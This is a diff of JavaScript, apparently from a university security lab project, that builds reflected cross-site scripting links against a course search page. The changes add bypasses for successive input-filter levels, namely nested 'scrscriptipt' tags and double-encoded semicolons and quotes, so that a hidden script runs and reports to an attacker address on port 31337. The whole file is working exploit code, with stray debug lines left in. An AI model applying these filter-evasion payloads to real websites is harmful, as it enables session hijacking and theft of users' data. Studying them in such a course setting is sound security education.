@@ -75,15 +75,27 @@ function makeLink(xssdefense, target, attacker) {
             ";payload(\"" + attacker + "\");</script" + "></div>");
     } else if (xssdefense == 1) {
         return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
-            encodeURIComponent("<BODY id=\"POOP\" ONLOAD=\"alert(document.getElementById('POOP').innerHTML);\">hi</BODY>");
+            encodeURIComponent("<div style=\"display:hidden;\"><scrscriptipt" + ">" + payload.toString() +
+            ";payload(\"" + attacker + "\");</scrscriptipt" + "></div>");
     } else if (xssdefense == 2) {
         return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
-            encodeURIComponent("<div style=\"display:hidden;\"><script" + ">" + payload.toString() +
-            ";payload(\"" + attacker + "\");" + "></div>");
+            encodeURIComponent("<div style=\"display:hidden;\"><scrscriptipt" + ">" + payload.toString() +
+            ";payload(\"" + attacker + "\");</scrscriptipt" + "></div>");
     } else if (xssdefense == 3) {
-        return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
-            encodeURIComponent("<div style=\"display:hidden;\"><script" + ">" + payload.toString() +
-            ";payload(\"" + attacker + "\");</script" + "></div>");
+        var first = "./search?xssdefense=" + xssdefense.toString() + "&q=";
+        var encode = "<script" + ">decodeURIComponent(" + payload.toString() +
+                        ";payload(\"" + attacker + "\");)</script" + ">";
+        encode = encodeURIComponent(encode);
+
+        encode = encode.replace(/%3B/g, "%3%3BB");
+        // encode = encode.replace(/%3B/g, '&#%3B59');
+        // encode = encode.replace(/%22/g, '%2%222');
+        // encode = encode.replace(/%27/g, '%2%277');
+        // encode = encode.replace("%3B","&#0000059");
+        encode = encode.replace(/%22/g,"%2%222");
+        encode = encode.replace(/%27/g, "%2%277");
+       alert(encode);
+        return target + first + encode;
     } else { //xssdefense == 4 
         return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
             encodeURIComponent("<div style=\"display:hidden;\"><script" + ">" + payload.toString() +
@@ -94,7 +106,7 @@ function makeLink(xssdefense, target, attacker) {
 // return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
 //             encodeURIComponent("<div style=\"display:hidden;\"><BODY" + " ONLOAD=\"" + payload.toString() + ";payload(\"" + attacker + "\");\"></BODY></div>");
 
-var xssdefense = 1;
+var xssdefense = 3;
 var target = "http://eecs388.org/project2/";
 var attacker = "http://127.0.0.1:31337/";
 $(function() {
